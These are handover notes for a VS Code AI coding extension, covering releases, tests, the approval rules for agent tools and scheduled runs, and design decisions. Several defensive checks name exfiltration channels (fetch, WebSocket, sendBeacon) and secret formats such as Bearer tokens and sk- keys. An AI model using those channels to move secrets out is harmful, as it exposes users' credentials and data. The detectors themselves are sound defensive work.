  session variables with admin precedence, a review queue for tools and skills created by a
  normal user, and shared vs personal provider profiles. §14 has the reasoning. The scope fence
  is the user's and was stated four times: **none of this appears in the VSIX.** It leaked once —
  the programming-provider picker became visible in the extension — and the user caught it.
- **`--guide` opens the operator documentation as a web page**, built into the bundle.
- **The walkthrough is generated and takes you to each tab** (see the section above it).
- **The dispatcher and skill retrieval are on by default**, at the user's request: search for the
  tool first, and find skills the same way.
- **Expert cost is measured here rather than assumed**, with `resumeWorked` so two cold starts
  cannot masquerade as a cheap resume; plus a keep-alive so a lunch break does not cost a cold
  start. Their measured numbers are 0.007117 / 0.006539 — a ratio of 1.09 against the 19× this
  file documents from a different plan. `docs/office-plan.md` §1 rests on that and may need
  rewriting once it is known whether their resume actually happened.
- **Three fixes from office use**, all of which read as the feature being broken:
  `@` listed every file in `.venv` (a non-null `exclude` **replaces** `files.exclude` rather than
  adding to it — naming one folder turned off every folder the user had already hidden); a skill
  added by hand did not appear until the panel was reopened (the folders are watched now); and
  the documentation reindex is reachable from the MCP tab, where you are when you add a server.

### Answers to standing questions, so they are not re-derived

- **A shared OpenSearch index across a team is workable**, and the reason to think otherwise is
  wrong: indexed paths are **workspace-relative** (`indexer.ts` stores
  `path.relative(workspaceRoot, absolute)` with `/` separators), so two checkouts at different
  drive letters produce identical stored paths. What actually stands in the way is smaller —
  `codebaseIndexName()` hashes the absolute workspace path, so both people must set
  `embedder.indexName` to the same literal (config-file only today); the embedding model and
  width must match; and manifests stay per user (`index@storeId`), so the second person's
  "Index" re-embeds the whole repo. That converges rather than duplicating, because chunk ids
  derive from the relative path. The user withdrew the request on 2026-08-31 believing paths
  made it impossible; if it comes back, it is a field and a warning, not a project.
- **The 25-step cap is per turn.** `for (let iteration = 0; iteration < maxIterations; ...)` runs
  inside one turn, so replying "continue" grants a fresh 25. `maxIterations` is configurable.
- **The expert does know about tools and skills.** `expert/briefing.ts` sends
  `promptTools + dispatchOnlyTools` and the skill list once per cold session — names and
  one-line descriptions only, never schemas, because forty tools is a few hundred tokens as a
  list and thousands as schemas.
- **MCP tool documentation is indexed**, and reindexes automatically on connect, disconnect and
  `tools/list_changed`, debounced three seconds and fingerprinted.

### Still not done

`MANUAL_VERIFICATION.md` is still largely unrun and is still the oldest debt. Admin UI for shared
profiles is reserved in the protocol (`saveSharedProfile`, `setDefaultProfile`) with no handler.
No render test for `ReviewsTab`. Both pending versions are unpublished. And the standing warning
holds: **most of what has been built in recent sessions has never been rendered in a real
Extension Host** — jsdom proves behaviour, not appearance.

---

## Previous handover — 2026-08-19, superseded above

**Marketplace is on 0.30.0** (queried 2026-08-19). `main` is clean. **1043 tests**, 1 skipped.
Artifact `apps/vscode/light-code-vscode-0.30.0.vsix`.

### The habit that found almost everything this session

**Read the running system's state before changing code.** Four bugs in a row were diagnosed
this way and would not have been found by re-reading source:

- the user's `config.json` showed a schedule firing twice and then stopping — which ruled out
  the logic I had just "fixed" and pointed at the timer's *lifetime*;
- the same file showed a one-minute schedule beside a valid expert block, which is what
  identified the dropped-settings-reply bug;
- and showed `python: absent`, explaining both "tool creation shows a diff" and "my
  always-ask change did nothing" — Python tools were simply off;
- a real Edge-printed PDF disproved three assumptions the parser was built on.

**A correction to a previous commit message.** `fix(test): SearchActivity test used a stale
SearchLogEntry shape` claims the ui `typecheck` task covers different files than `build`. That
is **false** — they are the same command, verified by planting a type error and watching both
catch it. What actually happened is that I skipped `pnpm typecheck` in that round. The gate is
sound; do not go looking for a hole that is not there.

### Built since 0.22

- **Qdrant and Chroma** (`rag/qdrant`, `rag/chroma`), for *local* vector storage — a container
  on loopback, which is the case the user wanted. Hand-written REST, no vendor SDKs, because
  each client carries its own HTTP stack and invariant 2 requires core's `HttpClient`.
  Three adapter-shaping differences: Qdrant rejects string point ids (hashed to deterministic
  UUIDs, real id in the payload), Qdrant has nowhere to record ownership (a marker *point*
  where OpenSearch uses `_meta`), Chroma keys operations by collection UUID and returns
  distances rather than scores.
- **Copying an index between stores** (`rag/syncStores.ts`), so switching backend does not mean
  re-embedding. The guard is the feature: vectors are only comparable within one model, width
  and chunking, so it refuses unless the *source's manifest* matches what is configured now.
  Mixing embeddings yields confident, plausible, wrong neighbours with **no error anywhere**.
- **PDF** (`documents/pdf.ts`). Following `ToUnicode` is not optional — every modern producer
  subset-embeds `Identity-H` fonts, and an Edge-printed page was *entirely* undecodable until
  CMaps were followed. The quality gate is load-bearing: glyph soup is withheld, never returned.
- **Expert budget, estimate and assessment.** Budget is per chat, set from the header, adjustable
  mid-turn; the expert is told what remains so it plans to fit; it estimates the whole task with
  its plan; and it can assess the junior from *probe answers* rather than from the model's name.
- **Junior mode plans in checkpoints** and reviews each one — framed as a cost measure, because
  read as a quality ritual it produces a review after every edit.
- **Syntax highlighting** in chat and in approval diffs, no library. A new file renders as a file
  rather than an all-green diff against nothing.

### Bugs worth not reintroducing

- **A background run must not drop replies the user asked for.** 0.22's suppression was an
  *allow* list of two message types, which also swallowed `expert`, `settings` and friends —
  so with a one-minute schedule, opening Settings during a run left the tab on "Checking…".
  Now a deny list of conversation traffic (`host/backgroundMessages.ts`); the default is send.
  The failure modes are not symmetric: a stray transcript line is cosmetic, a dropped reply is
  a control that never answers.
- **Index manifests are keyed on `index@storeId`.** Keyed on the name alone, switching backend
  left a manifest asserting the new empty collection was already populated — the indexer skipped
  everything and search returned nothing, silently.
- **`path.resolve` keeps a trailing separator on a path that is already a root**, so
  `root + path.sep` matched nothing for a UNC share or a drive root. `isWithinRoot` is exported
  precisely so the test calls the shipped code rather than a copy of it.
- **Models over-escape Windows paths** — eight backslashes arrived for a NAS path, four survived
  parsing, and `path.resolve` turned that into a `C:\` path. Repaired (`fs/windowsPath.ts`)
  rather than refused, because the collapsed forms are not valid paths in the first place.
- **The scheduler died with the webview.** The bridge is created once per window now and the view
  attaches to it; the extension activates on `onStartupFinished` with a config-only poller that
  builds the bridge when something is due, so §11's "nothing spawns at startup" still holds.
  There is also a watchdog, because the timer stopped twice leaving no trace.
- **The Python tab never received its own saved settings** — only the resolved status, used for
  placeholders. Fields rendered blank, which reads as data loss and would have cleared them on
  the next save.

### Two rules added to the approval model

- **`ALWAYS_ASK_TOOLS`** (`approval/policy.ts`): creating, updating or deleting a Python tool,
  and writing or deleting a skill, are never auto-approved — not by a category toggle and not by
  the always-allow list, which is checked *after*. These write code that later runs or prose
  later injected into context, and auto-approving their creation compounds.
- **Reading outside the workspace is approvable in the chat**, showing the resolved path. The
  deny list is consulted *before* asking, writes never ask, and a scheduled run has no
  `requestPathAccess` at all — nobody is there, so an unattended run cannot widen its own access.

### Still not done

`MANUAL_VERIFICATION.md` remains largely unrun and is still the oldest debt — but **A6 is now
`pnpm audit:secrets`** and passes against real storage (38 files, nothing secret-shaped), which
is the first time that check has been run since Phase 6b. It was worth automating precisely
because it needed no judgement: a grep done by hand is done once and never again. Verified
non-vacuous by planting a Bearer token, an `sk-` key and a basic-auth URL. The rest of Session A
is about what the UI shows and no script can see that. OCR for scanned PDFs needs a
dependency. **Phase 9b is decided (2026-08-19).** Editing and file creation in a scheduled run are granted
by ticking the tools when the schedule is written — that allowlist *is* the approval, made in
advance for one named job, and the default remains nothing. What a schedule can never be granted
is `NEVER_AVAILABLE_TO_SCHEDULES`: creating or updating a Python tool, and writing or deleting a
skill. Authorising a *change* and authorising a *capability* are different acts, and §13 requires
approval showing the source — which cannot happen unattended. Note this had to be repeated in
`schedule/runner.ts` because a scheduled run **replaces** the approval gate rather than wrapping
it, so `ALWAYS_ASK_TOOLS` in `approval/policy.ts` never runs for it.

Publishing automation is **not wanted** — the user decided against it on 2026-08-19; manual
upload stays. `apps/host` multi-user is
unchanged and still unsafe. Publishing is still manual — no `VSCE_PAT`.

**Almost nothing built in the last three sessions has been rendered in a real Extension Host.**
jsdom covers behaviour; there are now render tests for `Select`, `DismissableProblems`,
`ExpertBudget`, `ExpertSpend`, `ExpertTab`, `PythonTab`, `SearchActivity` and `DiffView`. Write
one for any component with behaviour — several bugs this session would have been caught by one.

---

## Previous handover — 2026-08-15, superseded above

**Marketplace is on 0.22.1** (queried 2026-08-15, gallery API — not inferred). `main` is clean.
861 tests, 1 skipped. Artifact `apps/vscode/light-code-vscode-0.22.1.vsix`.

### The one lesson worth carrying forward

**Twice this session a fix was correct and irrelevant, because it was at the wrong layer.** The
scheduler was "fixed" by repairing `isDue` — a real bug — and still never fired, because the
timer it feeds was being destroyed with the webview. Confinement was correct in every unit test
and still refused every network share, because the tests re-derived the comparison instead of
calling it.

The habit that resolved both: **get evidence from the running system before changing anything.**
Reading the user's actual `config.json` showed the schedule firing twice and then stopping,
which ruled out the logic and pointed at lifetime. Probing `path.resolve` on a UNC root showed
the doubled separator in one line. Neither would have come from reading the code again.

### Built today

- **The bridge outlives the webview.** It was created per `resolveWebviewView`, so the
  conversation, MCP connections and schedule timer all died when the panel was torn down — and
  the extension did not even activate until the panel was opened. Now `activate()` owns one
  bridge for the window; `WebviewTransport` retargets rather than being rebuilt, and
  `ChatBridge.resync()` pushes the transcript back to a newly created view. Activation is
  `onStartupFinished`, with a poller that reads *only* config and constructs the bridge when a
  schedule is genuinely due — §11's "nothing spawns at VS Code startup" still holds, and the
  VSIX smoke test proves `activate()` completes without building one.
- **That poller is also a watchdog.** It reads `ChatBridge.schedulerHealth()` and restarts the
  timer when the last tick goes stale. The timer has now stopped twice with nothing in the log;
  watching it is the honest response to that, and there is a manual **Restart** button plus a
  visible "last checked" time in the Schedules tab. A wedged run cannot hold the scheduler
  forever either.
- **Scheduled runs are backgrounded.** They used to call `startNewTask()` on the one shared
  conversation, so a job firing mid-chat wiped the user's transcript. The run snapshots
  conversation, task id, spilled handles, read-file set and checkpoint and restores them in the
  `finally` — **restored before anything else awaits**, so a message arriving as the run ends
  finds the right conversation. UI messages are suppressed by an allowlist
  (`BACKGROUND_SAFE_MESSAGES`), so a type added later is silent by default rather than leaking.
  Chat and schedules are serialized: a schedule defers while `userTurnRunning`, and a user
  message waits on `scheduledRunInFlight`.
- **Reading outside the workspace is approvable in the chat** (`requestPathAccess` on
  `ToolExecutionContext`). The prompt shows the *resolved* path. The deny list is consulted
  **before** asking, so a key can never be approved; writes never ask, because checkpoints
  snapshot only the workspace; and a scheduled run has no `requestPathAccess` at all, so an
  unattended run cannot widen its own filesystem access. "Always" stores the containing folder.
- **PDF, with no dependency** (`documents/pdf.ts`). See below.
- `notify` takes Markdown `details`, opened as a document from the toast. A VS Code
  notification is a plain string plus buttons — no Markdown, no table, no colour, and newlines
  are collapsed — so a multi-line `message` is flattened deliberately rather than left to be
  mangled.
- Clearing: individual run logs (keyed on start time, not index — the list is re-sorted and
  capped), whole-schedule and all-schedule run logs, the documentation index, and the red
  "Not loaded" problem lists.

### The containment bug, because it will look like a rounding error

`path.resolve` leaves a trailing separator on any path that is **already a root** — a UNC share
root keeps it, and so does a drive root. So `root + path.sep` built a doubled separator and
matched nothing. Adding a share under "Folders it may read" was silently useless, which is the
one case that setting exists for, and the model kept suggesting the file be copied into the
workspace because that is what the error told it.

The comparison is now `isWithinRoot`, **exported so the test calls the shipped code**. A test
that re-derives the comparison agrees with itself and passes either way. Verified non-vacuous:
reverting the fix fails exactly the UNC and drive-root cases.

Also: Windows reports `UNKNOWN`, not `ENOENT`, for a UNC host it cannot reach, and
`realpathAllowingMissing` rethrew it — a mistyped server name escaped as an unhandled error from
inside a tool. Unresolvable codes now fall through to confinement.

### PDF — what it does and what it refuses

Zero dependency, because pdf.js is megabytes every user downloads whether or not they open a
PDF. Objects are indexed by scanning (not via the xref, which is the part a damaged or
incrementally updated file gets wrong), each page's resources resolve `/F4` to a font, and the
font's `ToUnicode` CMap decodes its codes.

**Following `ToUnicode` is not optional.** Every modern producer subset-embeds fonts with
`Identity-H`, where codes are two-byte glyph indices meaningful only inside that file. Measured:
a page printed by Edge came back *entirely* undecodable until CMaps were followed.

Three things the first version got wrong, all found against a real file and none of which a
hand-written fixture would have contained:
- Chromium emits **one `Td` per glyph**, so treating `Td` as a line break put one character on
  each line. Only a *vertical* move, a `Tm` with a changed y, `T*` or `ET` is a break.
- `<<` opens a dictionary, not a hex string. Skipping one character landed on the second `<` and
  read `<</MCID 0 >>` as hex, contributing a stray character mid-text.
- A `(` inside a string is escaped but a `)` in a nested balanced pair is not, so the content
  stream is scanned rather than regexed.

**The quality gate is the load-bearing part.** Text that decodes to glyph soup is *withheld*,
not returned — a model handed mojibake summarises it confidently and is wrong, which is worse
than being told to convert the file. The same gate catches a scanned PDF. Encrypted files are
detected separately, because "no text" would send the user after the wrong problem.

`documents/fixtures/chromium-report.pdf` is a genuine Edge-printed PDF, checked in on purpose:
regenerate one with `msedge --headless=new --print-to-pdf=out.pdf page.html` if another producer
needs covering.

### Still not done

`MANUAL_VERIFICATION.md` has never been run and is now by a distance the oldest debt — Session A
is the security properties, and this session added two more of them (in-chat path approval, and
the deny list beating it). Consultation cap. Qdrant and Chroma (the seam is ready; OpenSearch
works and `search_docs` degrades lexically, so this is optional rather than blocking). Phase 9b
is done bar an explicit decision on widening what a schedule may do.

**Never rendered in a real Extension Host:** the theme, Junior mode, the cost meter, the
dispatcher section, the search panel, and everything added today. jsdom tests prove behaviour,
not appearance — `packages/ui/src/settings/DismissableProblems.test.tsx` and `Select.test.tsx`
are the pattern to copy for any component with behaviour.

---

## Previous handover — 2026-08-14 (fourth), superseded above

**Confirmed working in a real office install:** Python tools and the Skills tab. Those were the
two oldest untested paths in the project and they are now closed. The rest of the UI still has
not been rendered — see below.

**Where the code is.** `main`, clean, 685 tests. Artifact `light-code-vscode-0.15.0.vsix` (0.16.0
pending the changeset in `.changeset/`). Marketplace was on 0.11.0 at last check; 0.12.0 and
0.13.0 were versioned and never published. **Query the gallery, never trust a version here.**

### Built today, in order

- **Junior mode** (§12b) with a persistent expert session. Measured, not assumed: cold
  consultation $0.187 / 18,643 cache-creation tokens, resumed $0.0099 reading the same cache.
  **Do not re-tighten the guidance to "consult as little as possible"** — that was only correct
  while every call was a cold start, and the session inverted it.
- **The dispatcher is wired now.** `retrieval.dispatcher` in Settings → Search, off by default.
  MCP and Python tools become `dispatchOnly`; built-ins stay listed. A test found the real
  tradeoff: it halves the prompt at forty tools and **makes it bigger at three**, because
  `call_tool` carries its own description. The tab shows the hidden-tool count for that reason.
- **`forget_docs`** releases used documentation, derived from the transcript like superseding.
- **Skills across several folders**: one writable (`skills.dir`), read-only extras
  (`skills.paths`), `PATH`-style precedence, shadowing reported. `skills` is user-scope only.
- **Automatic documentation reindexing**, fingerprinted and debounced 3s.
- **`embedder.indexPrefix`**, applying to both derived index names.
- **Search activity panel** — every query the model ran, whether it was semantic or lexical,
  and a box to run one by hand through the same path.

### Things worth not rediscovering

- **`search_docs` never serves a schema from the index.** A hit resolves to a *name*; the
  parameters come from the live registry, and a hit for a tool that no longer exists is
  dropped. That is why a stale index costs findability and never correctness.
- **The lexical fallback is load-bearing**, not polish. Without it, enabling the dispatcher
  with no vector store would make every MCP tool permanently unreachable.
- **Nothing breaks when OpenSearch is down.** Every path is guarded: `resolveSearch` returns
  undefined and the tools are simply not offered; `search_codebase` and `search_opensearch`
  return tool errors; `search_docs` falls back to lexical; index listing catches to `[]`; the
  auto-reindex logs and retries. Chat, editing, commands, MCP and the expert never touch it.
- **Python tool folders stay singular, deliberately** (decided 2026-08-14). A tool is executable
  code and §13's real mitigation is that it lives in the repo under review. Read-only extras
  would also need a second approval-hash store outside `.registry.json`, which is the
  two-stores-that-diverge problem §15 warns about, on the sharpest surface in the project.

### Components can be render-tested now — use it

**There is a DOM environment as of 2026-08-14.** One dev dependency (`jsdom`), opted into per
file with `// @vitest-environment jsdom`, so the six hundred node tests do not pay for it. The
vitest glob also now matches `*.test.tsx`, which it did not before — a component test could not
have run even if someone had written one, which is a large part of why none existed.

`packages/ui/src/Select.test.tsx` is the first, rendered with `react-dom/client` and React's own
`act` rather than a testing library — one dependency buys the capability, and what is worth
pinning here is events on real DOM nodes. **Write one for any component with behaviour.** The
scroll-close bug that reached the office is now covered, and verified non-vacuous by reverting
the fix and watching it fail.

jsdom has no layout, so `scrollIntoView` does not exist on its elements. Stub it in the test
rather than guarding the call in shipping code — every real browser has it.

**Still unrendered in a real Extension Host:** the theme, Junior mode, the cost meter, the
dispatcher section and the search panel. A jsdom test proves behaviour, not appearance.

### Not built

Consultation cap; Qdrant (seam ready, now optional since OpenSearch works and `search_docs`
degrades lexically); Chroma; Phase 9b (gated on an explicit decision);
`MANUAL_VERIFICATION.md`, still never run and still the oldest debt.

---

## Previous handover — 2026-08-14 (third session), superseded above

**Where the code is.** `main` at `a11e850`, clean. **652 tests**, 1 skipped. Lint, build,
typecheck, invariant-4 and the VSIX smoke test all green. Packaged artifact is
`apps/vscode/light-code-vscode-0.13.0.vsix`, and its contents were verified by extracting it
and grepping both bundles — not by trusting timestamps, which misled once this session.

**Marketplace was on 0.11.0** (queried 2026-08-14). 0.12.0 was versioned and never published;
0.13.0 supersedes it. **Query the gallery, never repeat a version from this file** — that note
has been stale three times now.

### The single most important fact for the next session

**Nothing built today has ever been rendered.** Six user-facing features shipped into the VSIX
— theme and motion, the custom `Select`, the expert colour, Junior mode, the cost meter, the
Appearance tab — and the webview has never painted once. The smoke test stubs `vscode` and
calls `activate()`; it does not mount React. There is no DOM test environment in this repo
(`environment: 'node'`, glob `*.test.ts`), so **no component here has ever been render-tested**,
which predates today but is why the dropdown fix had to be made twice.

Before building anything else on top, install the VSIX and open the panel. Most likely to be
wrong, in order: the `Select` popup position (it is `position: fixed` with a flip-upward rule,
opened from the bottom of a narrow sidebar); the Python and Skills tabs (still never opened);
green against a light editor theme.

### Junior mode (0.13.0) — and the measurement that shaped it

A cheap model works, the Claude CLI expert plans. `JUNIOR_MODE` in `modes/builtin.ts`; the
guidance text *is* the feature.

**Measured against CLI 2.1.227, not assumed** — a cold consultation pays
`cache_creation_input_tokens: 18643` to establish Claude Code's own prompt and tools, costing
**$0.187 to reply "OK"**. Resuming the session reads that same cache and costs **$0.0099**.
Nineteen times cheaper. `consultExpert` captures `session_id` and passes `--resume`; the
session is task-scoped and reset with the task; a stale id degrades to a cold start rather
than failing the turn. Cache TTL is 1 hour (`ephemeral_1h_input_tokens`), so this holds while
a session is active.

**This inverted the design.** The first cost analysis said "ration consultations severely",
which was true only because every one was a cold start. With a session the first is expensive
and the rest are cheap, so the guidance now says *make the first one count and never repeat
context afterwards*. Do not re-tighten it back to "consult as little as possible" without
re-measuring.

**The expert cannot reach any Light Code tool.** It is a separate CLI process holding only
`Read`/`Grep`/`Glob` — no MCP tool, no Python tool, no `search_docs`, and no way to discover
they exist. `expert/briefing.ts` sends an inventory once per session: **names and one-line
descriptions, never JSON schemas** (forty tools is a few hundred tokens as a list and
thousands as schemas), sent only on a cold session because a resumed expert still has it.

**Cost is metered in the chat**, above the token bar, scoped to the task. Failed consultations
are counted — one that errored partway can still have cost money — and unpriced ones are
tracked separately rather than added as zero, so the total never looks exact while being
incomplete. **Estimates of what the mode saves are unmeasured**: roughly 40–70% on a typical
task, order-of-magnitude only. The meter exists so this stops being a guess.

### Still inert: the dispatcher

`call_tool`, `search_docs`, `dispatchOnly` registration and `buildDocCorpus` all exist and are
tested (30 tests), and **nothing in `host/bridge.ts` registers them**. Consequence worth
knowing: the expert briefing asks `combined.get('search_docs')`, gets `undefined`, and tells
the expert to ask the junior directly instead of naming `search_docs`. It degrades correctly,
but the full loop (expert → "look it up" → junior fetches → reports back) needs the wiring.

Remaining work, in order:
1. Config: a `retrieval` block (user-scope only — it names an index and an embedder), off by default.
2. Bridge: register MCP and Python tools `dispatchOnly`; register `call_tool` and `search_docs`;
   build the docs index from `buildDocCorpus`.
3. Eviction — the user asked to drop retrieved docs back out of context. `context/supersede.ts`
   already does this for superseded `read_file` results and is where to extend.
4. A **Search tab panel** (user-requested): recent queries and an ad-hoc box. `runDocsSearch` is
   already split out from the tool so the panel runs the identical path.

**Do not** index a tool already advertised in the prompt, and do not let `search_docs` serve a
schema from the index — both load-bearing, explained in `rag/toolDocs.ts`.

### UI conventions introduced today — read before touching `packages/ui`

- **`styles.ts` is a constructable stylesheet (`adoptedStyleSheets`), deliberately.** It is
  CSSOM, so it is not subject to `style-src`, and the webview keeps `default-src 'none'` with
  no `style-src` entry. **Do not convert it to a `<style>` tag or a bundled `.css` import** —
  either reintroduces the allowance it exists to avoid.
- **Hover is an inset `box-shadow`, not `background-color`.** Inline styles beat stylesheet
  rules and nearly every button sets its own background inline, so a `background-color` rule
  is silently ignored on exactly the buttons that matter.
- **There are no native `<select>` elements left.** A dropdown popup paints its selected row
  with the system highlight, which no CSS reaches, and macOS ignores CSS in that popup
  entirely. `Select.tsx` renders its own listbox. Do not reintroduce `<select>`.
- Two colour families, `accent` and `expert`, both written by the shared `writeTokens` so
  their token shapes cannot drift. Text colour on either is *computed* (`contrastFor`),
  because the default accent is green and white-on-green fails.
- The expert colour marks **authorship**: an `ask_expert` result is Claude's words and is
  coloured as such; a merely `expertInformed` reply is the primary model's own text and gets a
  small chip instead. Do not collapse the two.

---

## Previous handover — 2026-08-14 (second session), superseded above

**Three things changed today. The first two close long-standing unknowns.**

1. **OpenSearch indexing is verified against the user's real cluster.** They confirmed it
   works. This was blocker #1 in the previous handover and it is gone — indexing is no longer
   an unproven path, and the Qdrant work is unblocked.
2. **The marketplace is on 0.11.0**, published 2026-08-13. Queried directly, not inferred.
   The note below claiming 0.8.1 was stale *again* — that is now three times. **Query the
   gallery. Do not repeat a version from this file.**
3. **Two features landed** (see §12's dispatcher subsection and §19): the `VectorStore` seam,
   and a `call_tool` + `search_docs` dispatcher so tool schemas can leave the prompt.

**Where the code is.** `main` at `cd10643`, clean, everything committed. 615 tests passing,
1 skipped (the symlink case). Build and lint green. Latest built artifact is still
`light-code-vscode-0.11.0.vsix`; the Skills tab, the seam and the dispatcher all landed after
it, so the next package is 0.12.0.

**The dispatcher is built but NOT yet wired into the bridge.** This is the important caveat:
`call_tool`, `search_docs`, `dispatchOnly` registration and the doc corpus all exist and are
tested, but nothing in `host/bridge.ts` registers MCP or Python tools as `dispatchOnly`, and
no config key turns it on. It is inert in the running product. Remaining work, in order:

1. Config: a `retrieval` block (user-scope only — it names an index and an embedder) with the
   dispatcher off by default.
2. Bridge: register MCP and Python tools `dispatchOnly` when it is on; register `call_tool`
   and `search_docs`; build the docs index from `buildDocCorpus`.
3. Eviction — the user explicitly asked to be able to drop retrieved docs back out of
   context. `context/supersede.ts` already does exactly this for superseded `read_file`
   results and is the place to extend.
4. A **Search tab panel** (user-requested): recent queries and an ad-hoc query box.
   `runDocsSearch` is already split out from the tool so the panel can run the identical path.

**Do not** index a tool that is already advertised in the prompt, and do not let `search_docs`
serve a schema from the index — both are load-bearing and explained in `rag/toolDocs.ts`.

---

## Previous handover — written 2026-08-14, superseded above

**Where things are.** `main` is clean at `d90f15a`; everything is committed and pushed except
this handover. Latest built artifact is `light-code-vscode-0.11.0.vsix`; the Skills tab landed
after it, so the next package will be 0.12.0. The marketplace listing was on **0.8.1** at last
check and 0.10.0 was uploaded on 2026-08-13 but had not appeared — **query the gallery, do not
trust this paragraph** (trap: two claims in these notes were stale for months).

**Blocked on the user — do not start these without their input:**
1. ~~Verify OpenSearch indexing against their real cluster.~~ **Done 2026-08-14 — it works.**
2. **Open the Python tab and the Skills tab in a real Extension Host.** Phase 9 and the Skills
   tab were driven entirely from scripts. Most likely place for a bug. Still outstanding.

**Agreed next build, in this order — decided 2026-08-13, do not re-litigate:**
1. *After* OpenSearch is verified: extract a `VectorStore` interface, then add **Qdrant**.
   Note the seam does **not** exist — `rag/opensearch/*` is concrete and
   `vectorStoreSchema.kind` is `z.literal('opensearch')`, so this starts with the refactor.
2. Then Chroma, if still wanted.
3. Then decide whether skills should move into a vector store (`search_docs`). **Not** by
   varying tool definitions per turn — §12 forbids that specifically.

**Known and unfixed:** the user reported a turn that ended silently ("nothing happened, I had
to send another message"). The obvious cause is ruled out — a turn with no text and no tool
call already emits an explicit error. Undiagnosed for want of a transcript. If it recurs, the
`Light Code` output channel has the turn log.

**Do not build** Phase 9b (scheduled prompts) without an explicit decision; see below.

**A rule earned twice this week:** before repeating any claim about the running system —
especially from this file — check it. Grep for the config key, query the registry, run the
command. The step cap was documented as configurable since Phase 0 and nothing passed it; the
published-version note was wrong for eight releases and was repeated to the user as fact.

---

**Still outstanding, and now the oldest debt in the project:** `MANUAL_VERIFICATION.md` has
never been run. Session A is the security properties — deny actually blocking execution, the
approval prompt showing ground truth, and the exact-match command allowlist. 0.4.0 adds two
things that raise the stakes: a tool that spends money, and a checkbox that can disable TLS
verification. Neither is covered by an automated test.

**Phase 8 done — release engineering. It found a bug that would have shipped a dead
extension:**
- **`@vscode/ripgrep` was imported from core**, which put a *top-level* `require` for it
  into the bundle. That package is not inside the VSIX under `--no-dependencies`, so
  **every published install would have failed to activate with `MODULE_NOT_FOUND`** — not a
  broken search tool, a dead extension. `pnpm build`, `pnpm typecheck`, `pnpm test` and
  `vsce package` all passed. Nothing in the pipeline had ever looked at the artifact.
- Fixed properly rather than patched: **core no longer knows ripgrep exists.** The binary
  path arrives via `ToolExecutionContext.ripgrepPath`, supplied by the host — which is what
  §4 required all along, since a platform-specific binary is a platform concern. The host
  resolves `dist/bin/rg` (packaged) or falls back to `@vscode/ripgrep` (F5 from source),
  and the fallback is a **lazy call expression inside a function**, never an import: an
  import is hoisted back to a top-level require and reintroduces the bug. There is a
  comment saying so at the call site. Missing ripgrep now degrades two tools with a clear
  message instead of taking activation down.
- `scripts/smoke-test-vsix.mjs` — **extracts the packaged VSIX, loads `extension.js` with a
  stubbed `vscode`, and calls `activate()`.** This is the check whose absence let the above
  through, and it runs in CI on every push. It also asserts that every asset the manifest
  references is actually in the package.
- `scripts/check-no-external-urls.mjs` — **invariant 4's CI check, which CLAUDE.md had
  claimed since Phase 0 and which did not exist.** Not "no URL strings": presets and
  placeholders legitimately appear in the bundle. It is (a) an allowlist of hosts, each
  with a recorded reason, so a *new* host is a deliberate decision rather than an unnoticed
  diff, and (b) **no network primitives at all in `webview.js`** — `fetch`, `XMLHttpRequest`,
  `WebSocket`, `EventSource`, `sendBeacon`. Verified non-vacuous by planting an exfiltrating
  `fetch()` and confirming both detectors fire.
- **Platform-specific VSIXes.** ripgrep ships one npm package per platform, so the release
  workflow builds six targets and each carries exactly one ~5MB binary.
  `scripts/fetch-ripgrep.mjs` fetches a cross-platform binary via `npm pack` (a build step,
  not something the product does). `esbuild.mjs --target=` selects it and **clears
  `dist/bin` first** — otherwise a linux build followed by a win32 build ships both.
- `.github/workflows/release.yml` — manual dispatch only, with an explicit publish choice.
  Refuses to run if the manifest version does not match the requested one. Open VSX is
  `continue-on-error` so a failure there cannot leave the main marketplace half-published.
- CI now also runs an **offline job**: full suite plus VSIX activation with outbound 80/443
  rejected, proving nothing in startup silently depends on being online.
- README rewritten — **it is the marketplace listing page**, and it previously said
  "early scaffold. Not yet usable." Now carries the honest capabilities-and-limits section
  §3 requires, including no sandboxing and no protection from same-user processes.
- Changesets configured with `@light-code/core` and `@light-code/ui` on the ignore list;
  they are bundled, never published, and would otherwise be pushed to npm every release.

**Still to do before publishing:** create the Azure DevOps PAT and the Open VSX token (only
the user can), add them as `VSCE_PAT` / `OVSX_PAT` repository secrets, and run the Release
workflow. `pnpm verify:release` runs the whole gate locally.

**Phase 7 done — Anthropic and Gemini, images, `@` mentions, context management:**
- `providers/schema.ts` — tool schema translation per wire format, the surface §11 names as
  a silent-failure source. The rule is **translate structure, drop what a target cannot
  represent, never pass through and hope**: a provider that does not understand a keyword
  usually *ignores* it, so the model emits arguments the tool rejects and nothing points at
  the schema. Gemini is the strict one — `additionalProperties`, `oneOf`, `minLength` and
  friends are a 400, not a warning — so they are pruned **recursively**. Pruning only the
  top level looks correct against a flat schema and breaks on any nested array or object;
  there is a test for exactly that, and another proving a property literally *named*
  `format` or `default` is not mistaken for a keyword.
- `providers/anthropic.ts` — three divergences, each silent if missed: the system prompt is
  a top-level `system` parameter, tool results are `user` messages carrying `tool_result`
  blocks (and **consecutive results must be merged**, or parallel tool calls produce an
  invalid alternation), and content is a block array. Streaming accumulates
  `input_json_delta` fragments per block index until `content_block_stop`.
- `providers/gemini.ts` — diverges further. Model id in the URL path; **`alt=sse` is
  required** or the response is a chunked JSON array that parses fine until a large response
  splits mid-object; the assistant role is `model`; and **function calls carry no id**,
  while the loop, transcript and approval gate all key results by id — so one is synthesised
  and mapped back by *name*, which is all Gemini offers to match on.
- **`ApiKeyAuthStrategy` is now wire-format-aware.** Anthropic wants `x-api-key`, Gemini
  wants `x-goog-api-key`, OpenAI wants `Authorization: Bearer`. Hardcoding Bearer would have
  produced a 401 that reads as a bad key rather than a bad header. Derived from the profile,
  still overridable for a gateway that fronts a provider differently.
- `context/supersede.ts` — drops superseded `read_file` results. Two constraints: only
  reads (a repeated `execute_command` is not redundant — running the tests twice gives two
  real answers), and the tool message is **replaced, not removed**, because deleting it
  orphans the tool call and every provider rejects that. Keyed on full arguments, so reading
  lines 1–100 and then 200–300 does not supersede.
- `context/compact.ts` — `findSafeBoundary` walks **backwards** from the preferred cut until
  no tool call is separated from its result; forwards would silently discard turns the user
  just had. Returns 0 for "do not compact" rather than cutting anyway. Failure leaves history
  untouched, and a summary larger than what it replaced is refused.
- `context/budget.ts` — estimates, and the UI says so. A real tokeniser means a WASM blob
  per encoding and would still be wrong for a gateway that rewrites the prompt; the point is
  proportion, and a 10% error does not change "tool results are 70% of the window".
- `context/mentions.ts` — **`@` mentions, requested mid-phase.** Not a tool: the user named
  the path, so there is nothing to decide and nothing to approve. But a mention path is
  user-typed text, not a capability, so it goes through `confine()` and the deny list
